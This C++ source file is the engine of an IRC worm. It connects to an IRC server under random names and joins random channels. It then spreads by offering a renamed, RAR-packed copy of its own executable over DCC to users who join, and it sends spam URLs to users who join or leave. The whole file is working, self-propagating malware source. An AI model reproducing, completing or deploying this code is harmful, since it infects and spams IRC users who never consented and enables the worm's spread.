#include "stdafx.h"
#include "xIrcWorm.h"
#include "prototypez.h"
#include "stdlib.h"
#include "stdio.h"

/* irc worm engine */

#define DccTimeout	(60*1000) // 1 minute timeout


DWORD WINAPI Dcc_Server(LPVOID xDccInfo)
{
	DCC_SERVER_INFO xDccSrvr;
	WSADATA wsd;
	SOCKET sdcc,sdcc_out;
	sockaddr_in xsin;
	HANDLE hfile;

	DWORD io_buffer;
	char fb[4096];

	memcpy(&xDccSrvr,xDccInfo,sizeof(DCC_SERVER_INFO));

	if(WSAStartup(MAKEWORD(1,1),&wsd)==0)
	{
		sdcc=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
		if(sdcc!=INVALID_SOCKET)
		{
		
			xsin.sin_port=htons(xDccSrvr.port);
			xsin.sin_family=AF_INET;
			xsin.sin_addr.s_addr=INADDR_ANY;

			if(bind(sdcc,(sockaddr *)&xsin,sizeof(xsin))!=SOCKET_ERROR)
			{
				if(listen(sdcc,1)!=SOCKET_ERROR)
				{
					sdcc_out=accept(sdcc,NULL,NULL);
					
					if(sdcc_out!=INVALID_SOCKET)
					{
						hfile=CreateFile(xDccSrvr.FileToSend,GENERIC_READ,FILE_SHARE_READ,
						 NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);

						if(hfile!=INVALID_HANDLE_VALUE)
						{
							do
							{
								if(ReadFile(hfile,&fb,sizeof(fb),&io_buffer,NULL)==TRUE)
									send(sdcc_out,fb,io_buffer,0);
							}
							while(io_buffer>0);

							CloseHandle(hfile);
						}

						Sleep(5000);	//wait before closing the socket !

						closesocket(sdcc_out);
					}
				}
			}

			closesocket(sdcc);
		}
	}	
	return 1;
}


DWORD WINAPI SendDccRequest(LPVOID xDccInfo)
{
	DCCInfo xDcc_Info;
	char xIrcBuffer[140],userip[25];
	SOCKADDR xsockaddr;
	int SizeOfxsa=sizeof(xsockaddr);
	int dccport=0,filesize=0;
	BOOL FileSending=FALSE;
	DCC_SERVER_INFO DccServer_Info;
	char filename[30],tempbuf[MAX_PATH];
	char xtmprar[MAX_PATH],packedfile[40];
	WIN32_FIND_DATA wfd;
	HANDLE hdccsrvr;

	memcpy(&xDcc_Info,xDccInfo,sizeof(DCCInfo));

	if(xDcc_Info.OveRideIp==TRUE)
	{
		lstrcpy(userip,xDcc_Info.Oip);
	}
	else
	{
		getsockname(xDcc_Info.xsocket,&xsockaddr,&SizeOfxsa);

		wsprintf(userip,"%d.%d.%d.%d",(BYTE)xsockaddr.sa_data[2],
			(BYTE)xsockaddr.sa_data[3],(BYTE)xsockaddr.sa_data[4],
			(BYTE)xsockaddr.sa_data[5]);	//get user ip string
	}

	srand(GetTickCount());		//randomize !

	dccport=(1000+(rand() % 200));	//random port between 1000 ~ 1200

	GetDccFileName(filename);		//get a file name

	GetTempPath(MAX_PATH,tempbuf);
	
	wsprintf(xtmprar,"%s%x%x%x%x.tmp",tempbuf,
		(rand() % 50),(rand() % 50),(rand() % 50),(rand() % 50));

	GetModuleFileName(NULL,tempbuf,MAX_PATH);

	lstrcpy(packedfile,filename);
	lstrcat(packedfile,".exe");

	if(AddToRar(xtmprar,tempbuf,packedfile,FILE_ATTRIBUTE_NORMAL)==TRUE)
	{

		FindClose(FindFirstFile(xtmprar,&wfd));	//use FindFirstFile to get the file size

		filesize=wfd.nFileSizeLow;

		lstrcpy(DccServer_Info.FileToSend,xtmprar);	//setup file name
		DccServer_Info.port=dccport;	//setup port
		DccServer_Info.FileSending=&FileSending;	//setup pointer to status

		hdccsrvr=XThread(Dcc_Server,&DccServer_Info);	//start a dcc server

		wsprintf(xIrcBuffer,"NOTICE %s :DCC send %s.rar (%s)\r\n",
			xDcc_Info.xNick,filename,userip);		//dcc notice
	
		send(xDcc_Info.xsocket,xIrcBuffer,lstrlen(xIrcBuffer),0);
	
		wsprintf(xIrcBuffer,
			"PRIVMSG %s :%cDCC SEND %s.rar %d %d %d%c\r\n",
			xDcc_Info.xNick,1,filename,htonl(inet_addr(userip)),
			dccport,filesize,1);//send dcc request
	
		send(xDcc_Info.xsocket,xIrcBuffer,lstrlen(xIrcBuffer),0);

		WaitForSingleObject(hdccsrvr,DccTimeout);		//wait for the server to finish

		TerminateThread(hdccsrvr,1);

		CloseHandle(hdccsrvr);

		DeleteFile(xtmprar);
	}

	return 1;
}


DWORD WINAPI SendSpamUrl(LPVOID xSpamInfo)
{
	SpamInfo xSiNFO;
	SOCKADDR xsockaddr;
	int SizeOfxsa=sizeof(xsockaddr);
	char userip[21];
	char msg[200];
	char xIrcBuffer[256];

	memcpy(&xSiNFO,xSpamInfo,sizeof(SpamInfo));

	srand(GetTickCount());

	if(xSiNFO.OveRideIp==TRUE)
	{
		lstrcpy(userip,xSiNFO.Oip);
	}
	else
	{
		getsockname(xSiNFO.xsocket,&xsockaddr,&SizeOfxsa);

		wsprintf(userip,"%d.%d.%d.%d",(BYTE)xsockaddr.sa_data[2],
			(BYTE)xsockaddr.sa_data[3],(BYTE)xsockaddr.sa_data[4],
			(BYTE)xsockaddr.sa_data[5]);	//get user ip string
	
	}

	GenUrlSpamMessage(msg,userip);		//generate spam message

	wsprintf(xIrcBuffer,"PRIVMSG %s :%s\r\n",xSiNFO.nick2spam,msg);

	if(xSiNFO.AutoSpam==FALSE)
		Sleep((rand() % 10)*1000);
	
	send(xSiNFO.xsocket,xIrcBuffer,lstrlen(xIrcBuffer),0);
	
	return 1;
}

void xIrcWorm::InitWorm(char IrcServer[],int port)
{
	lstrcpy(Irc_Server,IrcServer);
	Irc_Port=port;
	number_of_channels=0;
	OverRideIP=FALSE;
}

int xIrcWorm::myrecv(BOOL GetLine)
{
	int i=0,retval;
	char recvied[1];

	memset(buffer,0,sizeof(buffer));					//zero buffer

	if(GetLine==FALSE)
		return(recv(Irc_Socket,buffer,sizeof(buffer),0));
	
	do
	{
		
		retval=recv(Irc_Socket,(char *)recvied,1,0);
		
		if(retval==0 || retval==INVALID_SOCKET)
			break;

		buffer[i]=recvied[0];

		i++;

		if(recvied[0]==0xD)
			break;

	}while(retval!=0 && retval!=INVALID_SOCKET);

	return(retval);	//recv & return
}


BOOL xIrcWorm::StartWorm()
{
	WSADATA wsd;
	LPHOSTENT	xhostnt;
	sockaddr_in	xsin;
	char user[20],realname[30],nick[20],*p1=NULL,ping_id[50];
	int i=0,retval;
	char szList[20],response[4],kicked_nick[20],rndstr[20];
	SOCKADDR xsockaddr;
	int SizeOfxsa=sizeof(xsockaddr);
	SpamInfo xSpamInfo;
	DCCInfo  xDccInfo;

	if(WSAStartup(MAKEWORD(1,1),&wsd)==0)
	{
		Irc_Socket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);		//create socket
	
		if(Irc_Socket!=INVALID_SOCKET)
		{
			xhostnt=gethostbyname(Irc_Server);		//dns irc server
			
			if(xhostnt!=NULL)
			{
				xsin.sin_family=AF_INET;
				xsin.sin_port=htons(Irc_Port);
				xsin.sin_addr=*((LPIN_ADDR)*xhostnt->h_addr_list);

				if(connect(Irc_Socket,(LPSOCKADDR)&xsin,
					sizeof(struct sockaddr))!=SOCKET_ERROR)	//connect server
				{

					Sleep(3000);	//sleep 3 seconds
					myrecv(FALSE);
					
					RandomString(user,8,FALSE);
					RandomString(rndstr,5,TRUE);
					GetRndUserStr(realname,FALSE);
					lstrcat(realname,rndstr);
					GetRndUserStr(nick,TRUE);

					wsprintf(buffer,"USER %s 8 * :%s\r\n",user,realname);
					send(Irc_Socket,buffer,lstrlen(buffer),0);
					wsprintf(buffer,"NICK %s\r\n",nick);
					send(Irc_Socket,buffer,lstrlen(buffer),0);

					myrecv(FALSE);

					p1=strstr(buffer,"PING :");

					if(p1!=NULL)		//some servers sending ping right after user registion
					{
						p1+=6;
						i=0;
						do
						{
							ping_id[i]=*p1;
							i++;
							p1++;
						}while(*p1!=0xd);

						wsprintf(buffer,"PONG %s\r\n",ping_id);			//build PONG command
						send(Irc_Socket,buffer,lstrlen(buffer),0);		//send PONG command

						myrecv(FALSE);								//recive message from server

					}

					p1=strstr(buffer,"001");

					if(p1!=NULL)
					{
		
						if(getsockname(Irc_Socket,&xsockaddr,&SizeOfxsa)==0)
						{

							if((BYTE)xsockaddr.sa_data[2]==192)	//is LAN ip ?
							{
								//if we got lan ip,try to get the ip from the irc server
								wsprintf(buffer,"USERIP %s\r\n",nick);
								send(Irc_Socket,buffer,lstrlen(buffer),0);
							
								myrecv(FALSE);

								p1=strstr(buffer,"@");
								
								if(p1!=NULL)
								{
									i=0;
									p1++;
									do
									{
										xIp[i]=*p1;
										p1++;
										i++;

										if(i>16)
											break;
									}while(*p1!=0x0D);

									xIp[i]=NULL;

									OverRideIP=TRUE;
								}
							}

						}

						wsprintf(szList,"LIST >%d\r\n",
							(rand() % 50)+(rand() % 100)); // build a list command
	

						send(Irc_Socket,szList,lstrlen(szList),0);
						
						retval=myrecv(TRUE);

						do
						{
							p1=buffer;

							do
							{
								p1++;
							}while(*p1!=0x20);

							i=0;

							do
							{
								p1++;
								response[i]=*p1;
								i++;
							}while(*p1!=0x20);

							response[3]=NULL;

							if(lstrcmp(response,"322")==0)	// RPL_LIST
							{
								do
								{
									p1++;
								}while(*p1!=0x20);

								p1++;
								i=0;

								do
								{
									channels_list[number_of_channels][i]=*p1;
									p1++;
									i++;
								}while(*p1!=0x20);		//copy channel name
								
								channels_list[number_of_channels][i]=NULL;

								number_of_channels++;

								if(number_of_channels>74)
								{
									lstrcpy(szList,"LIST STOP\r\n");
									send(Irc_Socket,szList,lstrlen(szList),0);
									break;
								}
							}
							
							else if(lstrcmp(response,"323")==0)	//RPL_LISTEND
								break;
							

							retval=myrecv(TRUE);

						}while(retval != 0 && retval!=INVALID_SOCKET);

						
						

						for(i=0;i<7;i++)	//join 6 random channels
						{
							wsprintf(buffer,"JOIN %s\r\n",
								channels_list[rand() % number_of_channels]);
							send(Irc_Socket,buffer,lstrlen(buffer),0);
						}

						retval=myrecv(TRUE);

						while(retval != 0 && retval != INVALID_SOCKET)
						{


							//process ping message
							p1=strstr(buffer,"PING :");

							if(p1!=NULL)
							{
								p1+=6;
								i=0;
								do
								{
									ping_id[i]=*p1;
									i++;
									p1++;
								}while(*p1!=0xd);
	
								wsprintf(buffer,"PONG %s\r\n",ping_id);//build PONG command
								send(Irc_Socket,buffer,lstrlen(buffer),0);//send PONG command
							
								goto do_recv;
							}

							//detect part / join

							if(strstr(buffer,"JOIN")!=NULL)
							{
								//process JOIN
								if(GetNickFromBuffer(xSpamInfo.nick2spam,buffer)==TRUE)
								{
									if(lstrcmp(nick,xSpamInfo.nick2spam)!=0)
									{
										srand(GetTickCount());

										if((rand() % 10)>4)	//select between spam or dcc
										{
											xSpamInfo.xsocket=Irc_Socket;
											xSpamInfo.AutoSpam=FALSE;

											if(OverRideIP==TRUE)
											{
												xSpamInfo.OveRideIp=TRUE;
												lstrcpy(xSpamInfo.Oip,xIp);
											}
											else
												xSpamInfo.OveRideIp=FALSE;

											XThread(SendSpamUrl,&xSpamInfo);
									
										}
										else
										{
											xDccInfo.xsocket=Irc_Socket;
											
											if(OverRideIP==TRUE)
											{
												xDccInfo.OveRideIp=TRUE;
												lstrcpy(xDccInfo.Oip,xIp);
											}
											else
												xDccInfo.OveRideIp=FALSE;

											lstrcpy(xDccInfo.xNick,xSpamInfo.nick2spam);

											XThread(SendDccRequest,&xDccInfo);
										}


									}
								}
							}
							else if(strstr(buffer,"PART")!=NULL)
							{
									//process PART
								if(GetNickFromBuffer(xSpamInfo.nick2spam,buffer)==TRUE)
								{
									if(lstrcmp(nick,xSpamInfo.nick2spam)!=0)
									{									
										xSpamInfo.xsocket=Irc_Socket;
										xSpamInfo.AutoSpam=TRUE;

										if(OverRideIP==TRUE)
										{
											xSpamInfo.OveRideIp=TRUE;
											lstrcpy(xSpamInfo.Oip,xIp);
										}
										else
											xSpamInfo.OveRideIp=FALSE;

										XThread(SendSpamUrl,&xSpamInfo);
									}
								}
							}
							else if (strstr(buffer,"KICK")!=NULL)
							{
								//process KICK
								
								p1=strstr(buffer,"KICK");

								if(p1!=NULL)
								{
									p1+=5;

									if(*p1=='#')
									{
										do
										{
											p1++;
										}while(*p1!=0x20);
										
										i=0;

										do
										{
											p1++;
											kicked_nick[i]=*p1;
											i++;
										}while(*p1!=0x20);
								
										kicked_nick[i-1]=NULL;

										if(lstrcmp(kicked_nick,nick)==0)
										{
											//if kicked join new channel

											wsprintf(buffer,"JOIN %s\r\n",
												channels_list[rand() % number_of_channels]);
						
											send(Irc_Socket,buffer,lstrlen(buffer),0);
										}
									}
								}
							}

do_recv:
							retval=myrecv(FALSE);

						}
					
					
					}
				}
			}
			closesocket(Irc_Socket);
		}
	}
	return FALSE;
}